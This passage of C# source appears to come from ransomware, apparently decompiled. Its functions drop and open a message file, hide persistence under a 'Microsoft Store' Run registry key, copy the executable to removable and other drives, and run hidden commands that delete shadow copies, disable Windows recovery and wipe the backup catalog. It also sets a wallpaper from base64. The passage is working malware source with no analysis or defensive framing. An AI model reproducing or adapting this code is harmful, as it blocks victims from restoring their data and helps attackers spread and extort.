		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
